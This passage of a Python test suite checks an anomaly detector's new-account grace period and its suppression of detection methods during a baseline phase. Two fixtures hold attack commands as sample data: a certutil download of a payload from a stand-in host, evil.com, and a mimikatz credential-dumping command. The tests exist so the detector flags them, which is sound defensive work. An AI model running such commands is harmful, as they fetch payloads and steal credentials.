    """Tests that new accounts are exempt from z-score and activity spike detection."""

    def _make_entries(self, user: str, count: int) -> list[dict]:
        """Create many auth entries for a user to trigger z-score/spike."""
        entries = []
        for i in range(count):
            entries.append({
                "type": "auth",
                "user": user,
                "source_ip": "8.8.8.8",
                "action": "login_success",
                "timestamp": f"2026-01-15T10:{i % 60:02d}:00Z",
            })
        return entries

    def test_new_account_skips_z_score(self):
        """New accounts should not trigger z-score detection."""
        # Create enough entries for a single user to be an outlier
        entries = self._make_entries("helpdeskone", 50)
        # Add enough users for the batch z to be computable (A15: >= 10 users
        # — the max z is sqrt(n-1); below that the threshold is unreachable)
        for i in range(11):
            entries.append({
                "type": "auth",
                "user": f"normaluser{i}",
                "source_ip": "8.8.8.8",
                "action": "login_success",
                "timestamp": "2026-01-15T10:00:00Z",
            })

        # Without new_accounts — should flag helpdeskone
        anomalies_no_grace, _ = detect_anomalies(entries, new_accounts=None)
        z_score_no_grace = [a for a in anomalies_no_grace
                           if a.get("detection_method") in ("z_score", "entity_z_score")
                           and a.get("user") == "helpdeskone"]

        # With new_accounts — should NOT flag helpdeskone
        anomalies_with_grace, _ = detect_anomalies(
            entries, new_accounts={"helpdeskone"}
        )
        z_score_with_grace = [a for a in anomalies_with_grace
                              if a.get("detection_method") in ("z_score", "entity_z_score")
                              and a.get("user") == "helpdeskone"]

        # helpdeskone should be flagged without grace period
        assert len(z_score_no_grace) >= 1
        # helpdeskone should NOT be flagged with grace period
        assert len(z_score_with_grace) == 0

    def test_new_account_skips_activity_spike(self):
        """New accounts should not trigger activity spike detection."""
        entries = self._make_entries("joindomain", 50)
        for i in range(5):
            entries.append({
                "type": "auth",
                "user": f"normaluser{i}",
                "source_ip": "8.8.8.8",
                "action": "login_success",
                "timestamp": "2026-01-15T10:00:00Z",
            })

        # Without new_accounts — should flag joindomain
        anomalies_no_grace, _ = detect_anomalies(entries, new_accounts=None)
        spike_no_grace = [a for a in anomalies_no_grace
                         if a.get("detection_method") == "activity_spike"
                         and a.get("user") == "joindomain"]

        # With new_accounts — should NOT flag joindomain
        anomalies_with_grace, _ = detect_anomalies(
            entries, new_accounts={"joindomain"}
        )
        spike_with_grace = [a for a in anomalies_with_grace
                           if a.get("detection_method") == "activity_spike"
                           and a.get("user") == "joindomain"]

        assert len(spike_no_grace) >= 1
        assert len(spike_with_grace) == 0

    def test_new_account_other_detections_unaffected(self):
        """New account grace period should NOT affect other detection methods."""
        entries = [{
            "type": "auth",
            "user": "helpdeskone",
            "source_ip": "8.8.8.8",
            "action": "login_failure",
            "timestamp": "2026-01-15T02:00:00Z",
        } for _ in range(10)]  # Off-hours + brute force

        anomalies, _ = detect_anomalies(entries, new_accounts={"helpdeskone"})
        # off_hours and brute_force should still fire
        methods = {a.get("detection_method") for a in anomalies}
        assert "off_hours" in methods or "failed_login_ratio" in methods

    def test_empty_new_accounts_set(self):
        """Empty new_accounts set is same as None — no grace period."""
        entries = self._make_entries("testuser", 50)
        for i in range(5):
            entries.append({
                "type": "auth",
                "user": f"normaluser{i}",
                "source_ip": "8.8.8.8",
                "action": "login_success",
                "timestamp": "2026-01-15T10:00:00Z",
            })

        anomalies_empty, _ = detect_anomalies(entries, new_accounts=set())
        anomalies_none, _ = detect_anomalies(entries, new_accounts=None)
        # Both should produce the same anomalies
        assert len(anomalies_empty) == len(anomalies_none)


# --- Phase-aware detection (baseline vs detection) ---

class TestBaselinePhaseSuppression:
    """Tests that baseline-dependent methods are suppressed during baseline phase."""

    def _make_auth_entries(self, n=50, user="alice", fail_ratio=0.7):
        """Generate auth entries that would trigger failed_login_ratio in detection."""
        entries = []
        for i in range(n):
            action = "login_failure" if i < int(n * fail_ratio) else "login_success"
            entries.append({
                "type": "auth",
                "user": user,
                "action": action,
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T10:{i % 60:02d}:00Z",
            })
        return entries

    def _make_off_hours_entries(self, user="bob"):
        """Generate auth entries during off-hours (22:00-06:00)."""
        entries = []
        for hour in [22, 23, 0, 1, 2]:
            entries.append({
                "type": "auth",
                "user": user,
                "action": "login_success",
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T{hour:02d}:00:00Z",
            })
        return entries

    def _make_multi_ip_entries(self, user="charlie"):
        """Generate entries from multiple IPs for impossible travel."""
        entries = []
        for i, ip in enumerate(["8.8.8.8", "1.2.3.4", "45.33.32.156", "9.10.11.12"]):
            entries.append({
                "type": "auth",
                "user": user,
                "action": "login_success",
                "source_ip": ip,
                "timestamp": f"2026-01-15T10:{i:02d}:00Z",
            })
        return entries

    def test_baseline_suppresses_failed_login_ratio(self):
        """Brute force detection (failed_login_ratio) suppressed in baseline."""
        entries = self._make_auth_entries()
        anomalies_det, _ = detect_anomalies(entries, phase="detection")
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")

        det_methods = {a["detection_method"] for a in anomalies_det}
        base_methods = {a["detection_method"] for a in anomalies_base}

        # Detection phase should find failed_login_ratio
        assert "failed_login_ratio" in det_methods or "entity_auth_failure" in det_methods
        # Baseline phase should NOT
        assert "failed_login_ratio" not in base_methods
        assert "entity_auth_failure" not in base_methods

    def test_baseline_suppresses_off_hours(self):
        """Off-hours detection suppressed in baseline."""
        entries = self._make_off_hours_entries()
        anomalies_det, _ = detect_anomalies(entries, phase="detection")
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")

        det_methods = {a["detection_method"] for a in anomalies_det}
        base_methods = {a["detection_method"] for a in anomalies_base}

        assert "off_hours" in det_methods or "entity_off_hours" in det_methods
        assert "off_hours" not in base_methods
        assert "entity_off_hours" not in base_methods

    def test_baseline_suppresses_multi_ip(self):
        """Multi-IP / impossible travel suppressed in baseline."""
        entries = self._make_multi_ip_entries()
        anomalies_det, _ = detect_anomalies(entries, phase="detection")
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")

        det_methods = {a["detection_method"] for a in anomalies_det}
        base_methods = {a["detection_method"] for a in anomalies_base}

        assert "multi_ip" in det_methods or "entity_new_ip" in det_methods
        assert "multi_ip" not in base_methods
        assert "entity_new_ip" not in base_methods

    def test_baseline_keeps_lolbin(self):
        """LOLBIN detection is always active, even in baseline."""
        entries = [{
            "type": "endpoint",
            "user": "admin",
            "host": "WS001",
            "process": "certutil.exe",
            "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
            "action": "process_create",
            "source_ip": "8.8.8.8",
            "timestamp": "2026-01-15T10:00:00Z",
        }]
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")
        base_methods = {a["detection_method"] for a in anomalies_base}
        assert "lolbin" in base_methods

    def test_baseline_keeps_attack_script(self):
        """Attack script detection is always active, even in baseline."""
        entries = [{
            "type": "endpoint",
            "user": "admin",
            "host": "WS001",
            "process": "mimikatz.exe",
            "command_line": "mimikatz sekurlsa::logonpasswords",
            "action": "process_create",
            "source_ip": "8.8.8.8",
            "timestamp": "2026-01-15T10:00:00Z",
        }]
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")
        base_methods = {a["detection_method"] for a in anomalies_base}
        assert "attack_script" in base_methods

    def test_baseline_suppresses_z_score(self):
        """Z-score detection suppressed in baseline."""
        # Create entries where one user has many more events than others
        entries = []
        for i in range(20):
            entries.append({
                "type": "auth",
                "user": "normal_user",
                "action": "login_success",
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T10:{i % 60:02d}:00Z",
            })
        for i in range(200):
            entries.append({
                "type": "auth",
                "user": "spike_user",
                "action": "login_success",
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T11:{i % 60:02d}:00Z",
            })
        anomalies_det, _ = detect_anomalies(entries, phase="detection")
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")

        det_methods = {a["detection_method"] for a in anomalies_det}
        base_methods = {a["detection_method"] for a in anomalies_base}

        # In detection phase, some baseline-dependent method should fire
        # (z_score, activity_spike, ewma, cusum, etc.)
        baseline_methods_in_det = det_methods & {"z_score", "entity_z_score", "activity_spike", "entity_activity_spike", "ewma", "cusum"}
        assert len(baseline_methods_in_det) > 0, f"Expected baseline-dependent method in detection, got: {det_methods}"

        # In baseline phase, NONE of these should appear
        assert "z_score" not in base_methods
        assert "entity_z_score" not in base_methods
        assert "activity_spike" not in base_methods
        assert "entity_activity_spike" not in base_methods
        assert "ewma" not in base_methods
        assert "cusum" not in base_methods

    def test_detection_phase_default(self):
        """Default phase='detection' preserves backward-compatible behavior."""
        entries = self._make_auth_entries()
        anomalies_default, _ = detect_anomalies(entries)
        anomalies_explicit, _ = detect_anomalies(entries, phase="detection")
        # Same results
        assert len(anomalies_default) == len(anomalies_explicit)

    def test_baseline_suppresses_ewma_cusum(self):
        """EWMA and CUSUM detection suppressed in baseline."""
        # Create time-series entries with a spike
        entries = []
        for i in range(30):
            entries.append({
                "type": "auth",
                "user": "alice",
                "action": "login_success",
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T10:{i:02d}:00Z",
            })
        # Add a burst
        for i in range(50):
            entries.append({
                "type": "auth",
                "user": "alice",
                "action": "login_success",
                "source_ip": "8.8.8.8",
                "timestamp": f"2026-01-15T11:00:{i:02d}Z",
            })

        anomalies_det, _ = detect_anomalies(entries, phase="detection")
        anomalies_base, _ = detect_anomalies(entries, phase="baseline")

        det_methods = {a["detection_method"] for a in anomalies_det}
        base_methods = {a["detection_method"] for a in anomalies_base}

        # EWMA/CUSUM should only appear in detection
        if "ewma" in det_methods or "cusum" in det_methods:
            assert "ewma" not in base_methods
            assert "cusum" not in base_methods

    def test_baseline_suppresses_entity_composites(self):
        """Entity behavior composite suppressed in baseline."""
        # This test uses mock entity profiles
        from nabla.baselines import EntityProfileStore, UserProfile, EWMAProfile
        import tempfile

        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            store_path = f.name

        try:
            store = EntityProfileStore(store_path)
            # Create a warm user with known baselines
            profile = UserProfile(observation_count=10)
            profile.typical_event_count = EWMAProfile(50.0, 10.0, 5.0)
            profile.typical_ips = {"8.8.8.8"}
            profile.typical_hours = {9, 10, 11, 12, 13, 14, 15, 16, 17}
            profile.auth_failure_ratio = EWMAProfile(0.05, 0.02, 0.01)
            store.users["alice"] = profile

            # Create entries that deviate from baselines
            entries = []
            for i in range(200):  # Much more than typical 50
                entries.append({
                    "type": "auth",
                    "user": "alice",
                    "action": "login_failure" if i % 3 == 0 else "login_success",
                    "source_ip": "1.2.3.4",  # New IP
                    "timestamp": f"2026-01-15T02:{i % 60:02d}:00Z",  # Off-hours
                })

            anomalies_det, _ = detect_anomalies(entries, entity_profiles=store, phase="detection")
            anomalies_base, _ = detect_anomalies(entries, entity_profiles=store, phase="baseline")

            det_methods = {a["detection_method"] for a in anomalies_det}
            base_methods = {a["detection_method"] for a in anomalies_base}

            # Composite should only appear in detection
            if "entity_behavior_composite" in det_methods:
                assert "entity_behavior_composite" not in base_methods
        finally:
            os.unlink(store_path)
